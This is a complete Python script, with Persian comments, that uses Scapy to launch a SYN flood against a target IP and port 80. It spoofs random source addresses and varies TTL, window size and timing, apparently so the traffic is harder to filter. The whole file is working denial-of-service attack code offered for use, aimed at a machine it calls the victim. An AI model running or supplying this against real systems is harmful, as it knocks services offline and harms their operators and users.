#!/usr/bin/env python3
from scapy.all import *
import random
import time

# 🎯 آدرس IP قربانی
target_ip = "192.168.159.129"  # آدرس ماشین قربانی خودت رو بذار

# 🎯 پورت قربانی (مثلاً وب سرور)
target_port = 80

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def random_ttl():
    return random.choice([64, 128, 255, random.randint(40, 200)])

def random_window():
    return random.choice([1024, 2048, 4096, 8192])

def syn_flood():
    while True:
        src_ip = random_ip()
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        window = random_window()
        ttl = random_ttl()
        ip_id = random.randint(0, 65535)

        ip_layer = IP(src=src_ip, dst=target_ip, ttl=ttl, id=ip_id)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=seq, window=window)

        packet = ip_layer / tcp_layer

        send(packet, verbose=0)

        # ⏱️ نرخ متغیر بین هر پکت (بین 5 تا 300 میلی‌ثانیه)
        time.sleep(random.uniform(0.005, 0.3))

if __name__ == "__main__":
    print(f"[*] شروع حمله SYN Flood به {target_ip}:{target_port}")
    syn_flood()
